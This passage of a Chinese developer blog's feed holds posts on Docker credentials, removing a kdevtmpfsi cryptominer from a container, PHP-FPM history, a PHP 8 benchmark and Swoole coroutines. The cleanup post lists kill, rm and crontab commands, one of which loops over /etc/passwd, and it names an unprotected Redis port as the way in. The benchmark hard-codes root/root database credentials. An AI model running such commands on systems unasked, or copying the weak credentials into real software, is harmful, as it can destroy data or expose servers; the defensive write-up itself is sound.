class="code"><pre><span class="line">$ gpg2 --full-generate-key</span><br></pre></td></tr></table></figure><h4 id="3-查看密钥所在路径"><a href="#3-查看密钥所在路径" class="headerlink" title="3. 查看密钥所在路径"></a>3. 查看密钥所在路径</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gpg2 -k</span><br></pre></td></tr></table></figure><h4 id="4-使用-pass-加载验证"><a href="#4-使用-pass-加载验证" class="headerlink" title="4. 使用 pass 加载验证"></a>4. 使用 <code>pass</code> 加载验证</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pass init &quot;your key location path&quot;</span><br></pre></td></tr></table></figure><p>至此就已经pass 掉了验证步骤，可以使用 <code>docker login</code> 正常登录了。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://ug.epurs.com/post/docker-login-error-saving-credentials/" target="_blank" rel="noopener">Docker login 报证书存储错误的解决办法</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天刚好有空，把前天那个被挖矿病毒感染的容器给换一换。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="运维" scheme="https://www.0x2beace.com/tags/%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>记一次服务器被 kdevtmpfsi 变矿机</title>
    <link href="https://www.0x2beace.com/remember-once-the-server-was-changed-into-a-miner-by-kdevtmpfsi/"/>
    <id>https://www.0x2beace.com/remember-once-the-server-was-changed-into-a-miner-by-kdevtmpfsi/</id>
    <published>2020-12-03T14:04:11.000Z</published>
    <updated>2020-12-06T14:51:34.359Z</updated>
    
    <content type="html"><![CDATA[<p>昨天有台测试服务器被告知服务异常，进服务器之后才发现是因为docker 异常退出了。</p><p><a id="more"></a></p><p>将docker 运行起来之后，发现有个不认识的进程 <code>kdevtmpfsi</code> 占用CPU 异常的多，Google 一下才知道，好家伙，服务器被当成矿机了。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201204164931.png" alt=""></p><p>直接 kill 并不能将其结束掉，它还有守护进程及可能存在的定时任务。</p><h3 id="1-首先查找文件"><a href="#1-首先查找文件" class="headerlink" title="1. 首先查找文件"></a>1. 首先查找文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ find &#x2F; -name kinsing      &#x2F;&#x2F; 守护进程</span><br><span class="line">$ find &#x2F; -name kdevtmpfsi   &#x2F;&#x2F; 挖矿进程</span><br></pre></td></tr></table></figure><p>如果Redis 是运行在本地，上面两个文件通常是在<code>/tmp/</code>目录下。</p><p>如果Redis 是以容器的方式运行，则通常是在<code>/var/lib/docker/overlay2/</code>（容器的 <code>/tmp/</code> 目录）下。</p><h3 id="2-将其删除"><a href="#2-将其删除" class="headerlink" title="2. 将其删除"></a>2. 将其删除</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ rm -f kinsing kdevtmpfsi</span><br></pre></td></tr></table></figure><p>这里被感染的容器也不一定是Redis ，比如我的则是PHP，所以需要进入到被感染的容器内才能找到。</p><h3 id="3-干掉进程"><a href="#3-干掉进程" class="headerlink" title="3. 干掉进程"></a>3. 干掉进程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ps -aux | grep kinsing</span><br><span class="line">$ ps -aux | grep kdevtmpfsi</span><br><span class="line">$ kill -9 pid</span><br></pre></td></tr></table></figure><h3 id="4-查看定时任务"><a href="#4-查看定时任务" class="headerlink" title="4. 查看定时任务"></a>4. 查看定时任务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ crontab -l</span><br></pre></td></tr></table></figure><p>存在定时任务的不一定是当前用户，可以使用以下命令查找其他用户是否存在任务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ for user in $(cut -f1 -d: &#x2F;etc&#x2F;passwd); do crontab -u $user -l; done</span><br></pre></td></tr></table></figure><p>定时任务还可能存在于以下地方：</p><ol><li><code>/etc/crontab</code></li><li><code>/var/spool/cron/</code></li><li><code>/var/spool/cron/crontabs/</code></li></ol><p>至此就完成了病毒的清理，网上千篇一律的全是这种处理方式，但这个方式并不适合我，我尝试了很多次，无论我怎么删除，病毒还是存在。</p><p>因为病毒是依赖于容器生存的，于是我便将容器停止掉，通过<code>docker logs</code> 实时查看容器最后10条日志：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs -f -t --tail 10 &lt;容器id&#x2F;容器名称&gt;</span><br></pre></td></tr></table></figure><p>十分钟之后，总算让我逮到了：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201204172650.png" alt=""></p><p>虽然目睹了全过程，但这时我依然无能为力，因为我不知道上面那些命令是如何自动启动的。</p><p>尝试了各种方式，但都无解，十分钟之后病毒还是会出来，最终我只能把这个被感染的容器给弃用了，重新起一个新的容器。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>kdevtmpfsi</code>病毒的产生，通常是因为Redis 对外开放 <code>6379</code>端口，且没设置密码或者密码过于简单导致。</p><p>所以服务器一定要设置好防火墙，像<code>3306</code>、<code>6379</code> 这种常用端口，尽量减少对外开放的机会。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://vms.drweb.cn/virus/?i=19722604&lng=cn" target="_blank" rel="noopener">Linux.Packed.753</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;昨天有台测试服务器被告知服务异常，进服务器之后才发现是因为docker 异常退出了。&lt;/p&gt;
&lt;p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="运维" scheme="https://www.0x2beace.com/tags/%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>PHP-FPM 进化史</title>
    <link href="https://www.0x2beace.com/the-evolution-of-php-fpm/"/>
    <id>https://www.0x2beace.com/the-evolution-of-php-fpm/</id>
    <published>2020-12-02T13:42:16.000Z</published>
    <updated>2021-01-03T08:14:50.203Z</updated>
    
    <content type="html"><![CDATA[<p>最近有幸读到<a href="http://blog.leanote.com/post/weibo-007/%E4%BB%8ECGI%E5%88%B0FastCGI%E5%88%B0PHP-FPM" target="_blank" rel="noopener">一篇文章</a>，一文将CGI 的进化史讲的特别详细，虽然我自己之前也整理过 <a href="https://www.0x2beace.com/what-is-the-relationship-between-php-fpm-and-nginx/">CGI、FastCGI、PHP-FPM 相关的笔记</a>，但是并没有从原理的角度来认识 CGI。</p><a id="more"></a><h2 id="CGI-的诞生"><a href="#CGI-的诞生" class="headerlink" title="CGI 的诞生"></a>CGI 的诞生</h2><p>早些年的Web 应用很简单，客户端通过浏览器发起请求，服务端直接返回响应。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201202210831.png" alt=""></p><p>随着互联网的发展，简单的Web 应用已经不能满足开发者们了。<br>我们希望Web服务器有更多的功能，飞速发展的同时还能让不同语言的开发者也能加入。</p><p><a href="https://www.ietf.org/rfc/rfc3875" target="_blank" rel="noopener">CGI协议</a>协议的诞生就是 Web服务器和其他领域的开发者在保证遵守协议的基础上，剩下的可以自由发挥，而实现这个协议的脚本叫做CGI 程序。</p><p>CGI协议规定了需要向CGI脚本设置的环境变量和一些其他信息，CGI程序完成某一个功能，可以用PHP，Python，Shell或者C语言编写。</p><p>在没有CGI 之前，其他语言如果需要接入Mysql 或者Memcache，还需要使用C 语言，但有了CGI协议，我们的Web处理流程可以变成下图这样：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201202211748.png" alt=""></p><h2 id="FastCGI-的诞生"><a href="#FastCGI-的诞生" class="headerlink" title="FastCGI 的诞生"></a>FastCGI 的诞生</h2><p>CGI程序存在致命的缺点：每当客户端发起请求，服务器将请求转发给CGI，WEB 服务器就请求操作系统生成一个新的CGI解释器进程(如php-cgi），CGI进程则处理完一个请求后退出，下一个请求来时再创建新进程。</p><p>我们知道，执行一个PHP程序的必须要先解析<code>php.ini</code>文件，然后模块初始化等等一系列工作，每次都反复这样非常浪费资源。</p><p><a href="http://andylin02.iteye.com/blog/648412" target="_blank" rel="noopener">FastCGI协议</a>在CGI协议的基础上，做出了如下改变：</p><ol><li>FastCGI被设计用来支持常驻（<code>long-lived</code>）应用进程，减少了<code>fork-and-execute</code>带来的开销</li><li>FastCGI进程通过监听的socket，收来自Web服务器的连接，这样FastCGI 进程可以独立部署</li><li>服务器和FastCGI监听的socket 之间按照消息的形式发送环境变量和其他数据</li></ol><p>我们称实现了FastCGI协议的程序为FastCGI程序，FastCGI程序的交互方式如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201202212619.png" alt=""></p><h2 id="PHP-FPM-的诞生"><a href="#PHP-FPM-的诞生" class="headerlink" title="PHP-FPM 的诞生"></a>PHP-FPM 的诞生</h2><p>FastCGI 程序固然已经很好了，但我们的需求总是有点苛刻，它还是存在一些明显缺点的：</p><ol><li>当我们更改配置文件(<code>php.ini</code>)后，<code>php-cgi</code>（FastCGI 程序） 无法平滑重启</li><li>我们fork的进程个数和请求量正比，请求繁忙时 fork 进程多，动态调整 <code>php-cgi</code>还没做到</li></ol><p>上面提及php-cgi 实现的FastCGI问题官方没有解决，幸运的是有第三方帮我们解决了，它就是 <code>php-fpm</code>。</p><p>它可以独立运行，不依赖php-cgi，换句话说，它自己实现了FastCGI协议并且支持进程平滑重启且带进程管理功能。</p><p>进程包含 <code>master</code> 进程和 <code>worker</code> 进程两类进程。</p><p><code>master</code> 进程只有一个，负责监听端口，接收来自Web Server 的请求，而 <code>worker</code> 进程则一般有多个（具体数量根据实际需要配置），每个进程内部都嵌入了一个PHP 解释器，是PHP 代码正真执行的地方。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="http://blog.leanote.com/post/weibo-007/%E4%BB%8ECGI%E5%88%B0FastCGI%E5%88%B0PHP-FPM" target="_blank" rel="noopener">从CGI到FastCGI到PHP-FPM</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近有幸读到&lt;a href=&quot;http://blog.leanote.com/post/weibo-007/%E4%BB%8ECGI%E5%88%B0FastCGI%E5%88%B0PHP-FPM&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;一篇文章&lt;/a&gt;，一文将CGI 的进化史讲的特别详细，虽然我自己之前也整理过 &lt;a href=&quot;https://www.0x2beace.com/what-is-the-relationship-between-php-fpm-and-nginx/&quot;&gt;CGI、FastCGI、PHP-FPM 相关的笔记&lt;/a&gt;，但是并没有从原理的角度来认识 CGI。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="PHP-FPM" scheme="https://www.0x2beace.com/tags/PHP-FPM/"/>
    
  </entry>
  
  <entry>
    <title>PHP 8.0 初体验</title>
    <link href="https://www.0x2beace.com/php-8-0-first-experience/"/>
    <id>https://www.0x2beace.com/php-8-0-first-experience/</id>
    <published>2020-12-01T13:09:15.000Z</published>
    <updated>2020-12-02T00:03:35.910Z</updated>
    
    <content type="html"><![CDATA[<p>昨天使用 homebrew 安装软件时，结果把我本地已安装的软件中能更新的全部给更新了一遍。</p><a id="more"></a><p>这其中就包括 <code>php8.0</code>。在<code>8.0</code> 正式出来之前，有听说过加入了新特性：JIT编译。</p><p>从理论上讲，JIT处理PHP脚本编译的方式能够提高应用程序的速度，但究竟能有多快呢？下面通过一个简单的例子来看看。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$startTime &#x3D; microtime(true);</span><br><span class="line">$mysqli &#x3D; new Mysqli(&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;root&quot;);</span><br><span class="line"></span><br><span class="line">function doSomething($db,$i)</span><br><span class="line">&#123;</span><br><span class="line">$hash &#x3D; md5($i);</span><br><span class="line">$db-&gt;query(&quot;INSERT INTO local.test(id, hash) VALUES($i, \&quot;$hash\&quot;)&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$i &#x3D; 1;</span><br><span class="line">while ($i&lt;100000) &#123;</span><br><span class="line">doSomething($mysqli, $i);</span><br><span class="line">$i++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$total &#x3D; microtime(true) - $startTime;</span><br><span class="line">var_dump(&quot;总耗时：&#123;$total&#125;秒&quot;);</span><br></pre></td></tr></table></figure><p>这里只是简单的向数据库不重复插入十万条数据。<br>我知道用这个脚本举例子并不好，但它却是离我日常使用最近的。</p><p><code>php7.3</code> 测试结果：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201201000322.png" alt=""></p><p><code>php8.0</code> 未开启 JIT 扩展测试结果：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201201000427.png" alt=""></p><p><code>php8.0</code> 已开启 JIT 扩展测试结果：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201201000725.png" alt=""></p><p>可以看到相比 7.3，足足快了近三分之一！</p><p>当然这个测试结果严格意义上来讲，并不准确，但看到数字从四十多秒缩短到三十秒，还是很惊喜的。</p><p>我的电脑配置：</p><ul><li>3.5 GHz 双核Intel Core i7</li><li>16 GB RAM</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;昨天使用 homebrew 安装软件时，结果把我本地已安装的软件中能更新的全部给更新了一遍。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>记一次 Linux 服务器性能调优</title>
    <link href="https://www.0x2beace.com/remember-a-Linux-server-performance-tuning/"/>
    <id>https://www.0x2beace.com/remember-a-Linux-server-performance-tuning/</id>
    <published>2020-11-30T15:45:09.000Z</published>
    <updated>2020-12-06T14:52:17.447Z</updated>
    
    <content type="html"><![CDATA[<p>轮询查 Db 对服务器（数据库）的压力究竟有多大？</p><a id="more"></a><p>前段时间接手一个老系统，其中对于“订单”的处理，非常原始且简单粗暴。</p><p>直接通过一个 PHP 脚本不断轮询查询数据库，直到查找到需要处理的“订单”才去处理，否则一直查找。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function doSomething()&#123;</span><br><span class="line">    &#x2F;&#x2F; 查询数据库</span><br><span class="line">    if ($exists)&#123;</span><br><span class="line">        &#x2F;&#x2F; todo</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">while(true)&#123;</span><br><span class="line">    doSomething();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类似的处理还有其他几个脚本。</p><p>因为项目的历史包袱较重，也不好做一些大调整，起初我并没有太在意，就直接部署到服务器上了。</p><p>就在最近，我收到反馈，系统有问题。通过一系列排查最后发现是因为“订单”处理不及时，“订单”堆积过多导致的一系列问题。</p><p>我寻思着，用户量也没有很多，为什么会处理不完呢？使用 glances 命令看了一眼。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201130214211.png" alt=""></p><p>这不看不知道，一看吓一跳，CPU 直接警告了。无论多好的机器也经受不住这样折腾，赶紧把轮询查表的方式改成了查队列。</p><p>基于Redis 的List 实现一个简单的消息队列，更新到服务器之后，可以看到CPU 直接降了一半。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201130213713.png" alt=""></p><p>为什么使用Redis 会比Mysql 的效果要好？</p><p>通俗一点解释是因为Redis 存储是基于内存，Mysql 存储是基于磁盘，而内存的读写要比磁盘快不止一个数量级。</p><p>当然，上面的处理方式并不是最优的，这里只是单论如何发现性能瓶颈，以及如何调优这一点来进行说明。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;轮询查 Db 对服务器（数据库）的压力究竟有多大？&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/Linux/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="运维" scheme="https://www.0x2beace.com/tags/%E8%BF%90%E7%BB%B4/"/>
    
    <category term="Redis" scheme="https://www.0x2beace.com/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>Swoole 协程学习</title>
    <link href="https://www.0x2beace.com/swoole-coroutine-learning/"/>
    <id>https://www.0x2beace.com/swoole-coroutine-learning/</id>
    <published>2020-11-29T14:36:47.000Z</published>
    <updated>2020-11-29T14:37:50.672Z</updated>
    
    <content type="html"><![CDATA[<p>第一次接触协程这个概念，是在学习Swoole时，那时看官方文档并不能完全理解协程到底是个什么东西以及该如何正确的使用它。</p><a id="more"></a><p>后来逐渐看了一些写的比较通俗的文章，加上自己的一些理解，逐步开始对协程有一些认识了。</p><h2 id="认识协程"><a href="#认识协程" class="headerlink" title="认识协程"></a>认识协程</h2><p><strong>协程不是进程或线程</strong>，其执行过程更类似于子例程，或者说不带返回值的函数调用。</p><p>上面那句话很关键，一句话就把协程是什么，不是什么说清楚了。</p><p>下面这张图可以很清晰的看到协程与多进程的区别：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201129093350.png" alt=""></p><h3 id="执行顺序"><a href="#执行顺序" class="headerlink" title="执行顺序"></a>执行顺序</h3><p>下面这段代码主要做了三件事：写入文件、发送邮件以及插入数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function task1()&#123;</span><br><span class="line">    for ($i&#x3D;0;$i&lt;&#x3D;300;$i++)&#123;</span><br><span class="line">        &#x2F;&#x2F;写入文件,大概要3000微秒</span><br><span class="line">        usleep(3000);</span><br><span class="line">        echo &quot;写入文件&#123;$i&#125;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function task2()&#123;</span><br><span class="line">    for ($i&#x3D;0;$i&lt;&#x3D;500;$i++)&#123;</span><br><span class="line">        &#x2F;&#x2F;发送邮件给500名会员,大概3000微秒</span><br><span class="line">        usleep(3000);</span><br><span class="line">        echo &quot;发送邮件&#123;$i&#125;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function task3()&#123;</span><br><span class="line">    for ($i&#x3D;0;$i&lt;&#x3D;100;$i++)&#123;</span><br><span class="line">        &#x2F;&#x2F;模拟插入100条数据,大概3000微秒</span><br><span class="line">        usleep(3000);</span><br><span class="line">        echo &quot;插入数据&#123;$i&#125;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">task1();</span><br><span class="line">task2();</span><br><span class="line">task3();</span><br></pre></td></tr></table></figure><p>这段代码和上面不同的是，这三件事情是交叉执行的，每个任务执行完一次之后，切换到另一个任务，如此循环。</p><p>类似于这样的执行顺序，就是协程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function task1($i)</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;使用$i标识 写入文件,大概要3000微秒</span><br><span class="line">if ($i &gt; 300) &#123;</span><br><span class="line">return false;&#x2F;&#x2F;超过300不用写了</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;写入文件&#123;$i&#125;\n&quot;;</span><br><span class="line">usleep(3000);</span><br><span class="line">return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function task2($i)</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;使用$i标识 发送邮件,大概要3000微秒</span><br><span class="line">if ($i &gt; 500) &#123;</span><br><span class="line">return false;&#x2F;&#x2F;超过500不用发送了</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;发送邮件&#123;$i&#125;\n&quot;;</span><br><span class="line">usleep(3000);</span><br><span class="line">return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function task3($i)</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;使用$i标识 插入数据,大概要3000微秒</span><br><span class="line">if ($i &gt; 100) &#123;</span><br><span class="line">return false;&#x2F;&#x2F;超过100不用插入</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;插入数据&#123;$i&#125;\n&quot;;</span><br><span class="line">usleep(3000);</span><br><span class="line">return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$i &#x3D; 0;</span><br><span class="line">while (true) &#123;</span><br><span class="line">$task1Result &#x3D; task1($i);</span><br><span class="line">$task2Result &#x3D; task2($i);</span><br><span class="line">$task3Result &#x3D; task3($i);</span><br><span class="line">if($task1Result&#x3D;&#x3D;&#x3D;false&amp;&amp;$task2Result&#x3D;&#x3D;&#x3D;false&amp;&amp;$task3Result&#x3D;&#x3D;&#x3D;false)&#123;</span><br><span class="line">break;&#x2F;&#x2F;全部任务完成,退出循环</span><br><span class="line">&#125;</span><br><span class="line">$i++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>swoole实现协程代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function task1()&#123;</span><br><span class="line">    for ($i&#x3D;0;$i&lt;&#x3D;300;$i++)&#123;</span><br><span class="line">        &#x2F;&#x2F;写入文件,大概要3000微秒</span><br><span class="line">        usleep(3000);</span><br><span class="line">        echo &quot;写入文件&#123;$i&#125;\n&quot;;</span><br><span class="line">        Co::sleep(0.001);&#x2F;&#x2F;挂起当前协程,0.001秒后恢复&#x2F;&#x2F;相当于切换协程</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function task2()&#123;</span><br><span class="line">    for ($i&#x3D;0;$i&lt;&#x3D;500;$i++)&#123;</span><br><span class="line">        &#x2F;&#x2F;发送邮件给500名会员,大概3000微秒</span><br><span class="line">        usleep(3000);</span><br><span class="line">        echo &quot;发送邮件&#123;$i&#125;\n&quot;;</span><br><span class="line">        Co::sleep(0.001);&#x2F;&#x2F;挂起当前协程,0.001秒后恢复&#x2F;&#x2F;相当于切换协程</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function task3()&#123;</span><br><span class="line">    for ($i&#x3D;0;$i&lt;&#x3D;100;$i++)&#123;</span><br><span class="line">        &#x2F;&#x2F;模拟插入100条数据,大概3000微秒</span><br><span class="line">        usleep(3000);</span><br><span class="line">        echo &quot;插入数据&#123;$i&#125;\n&quot;;</span><br><span class="line">        Co::sleep(0.001);&#x2F;&#x2F;挂起当前协程,0.001秒后恢复&#x2F;&#x2F;相当于切换协程</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$pid1 &#x3D; go(&#39;task1&#39;);&#x2F;&#x2F;go函数是swoole的开启协程函数，用于开启一个协程</span><br><span class="line">$pid2 &#x3D; go(&#39;task2&#39;);</span><br><span class="line">$pid3 &#x3D; go(&#39;task3&#39;);</span><br></pre></td></tr></table></figure><h3 id="协程与多进程"><a href="#协程与多进程" class="headerlink" title="协程与多进程"></a>协程与多进程</h3><p>由上面的代码，可以发现，协程其实只是运行在一个进程中的函数，只是这个函数会被切换到下一个执行。</p><blockquote><p>需要注意的是⚠️：</p></blockquote><p>协程并不是多任务并行处理，它属于多任务串行处理，它俩的本质区别是在某个时刻同时执行一个还是多个任务。</p><h3 id="协程的作用域"><a href="#协程的作用域" class="headerlink" title="协程的作用域"></a>协程的作用域</h3><p>由于协程就是进程中一串任务代码，所以它的全局变量、静态变量等变量都是共享的，包括 PHP 的全局缓冲区。</p><p>所以在开发时特别需要注意作用域相关的问题。</p><h3 id="协程的I-O连接"><a href="#协程的I-O连接" class="headerlink" title="协程的I/O连接"></a>协程的I/O连接</h3><p>在协程中，要特别注意不能共用一个 I/O 连接，否则会造成数据异常。</p><p>由于协程的交叉运行机制，且各个协程的 I/O 连接都必须是相互独立的，这时如果使用传统的直接建立连接方式，会导致每个协程都需要建立连接、闭关连接，从而消耗大量资源。那么该如何解决协程的 I/O 连接问题呢？这个时候就需要用到连接池了。</p><p>连接池存在的意义在于，复用原来的连接，从而节省重复建立连接所带来的开销。</p><h3 id="协程的实际应用场景"><a href="#协程的实际应用场景" class="headerlink" title="协程的实际应用场景"></a>协程的实际应用场景</h3><p>说了这么多，那协程倒底能解决哪些实际业务场景呢？下面通过一个实例来快速上手协程（笔者当时写这篇文章时，对协程的理解还不够深刻，所以这里引用<a href="https://learnku.com/blog/zxr615" target="_blank" rel="noopener">zxr615</a> 的”<a href="https://learnku.com/articles/44836" target="_blank" rel="noopener">做饭</a>“的例子来理解协程）：</p><p>传统同步阻塞实现逻辑：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function cook()</span><br><span class="line">&#123;</span><br><span class="line">$startTime &#x3D; time();</span><br><span class="line"></span><br><span class="line">echo &quot;开始煲汤...&quot; . PHP_EOL;</span><br><span class="line">sleep(10);</span><br><span class="line">echo &quot;汤好了...&quot; . PHP_EOL;</span><br><span 